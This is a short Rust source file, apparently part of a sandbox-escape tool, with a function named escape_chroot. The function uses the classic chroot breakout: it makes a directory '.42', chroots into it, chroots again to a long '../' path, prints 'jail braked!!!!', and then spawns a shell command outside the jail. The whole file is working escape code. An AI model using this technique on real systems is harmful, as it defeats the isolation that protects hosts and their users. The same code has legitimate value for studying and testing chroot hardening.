use super::spawn_sh;
use nix::unistd::{Pid, chroot, chdir, mkdir};
use nix::sys::stat::Mode;

pub fn escape_chroot(pid: Pid) {
    mkdir::<str>(".42", Mode::S_IRWXU | Mode::S_IRWXG | Mode::S_IRWXO).unwrap();
    chroot::<str>(".42").unwrap();
    chroot::<str>("../../../../../../../../../").unwrap();
    println!("jail braked!!!!");
    spawn_sh("ls -a", pid);
}
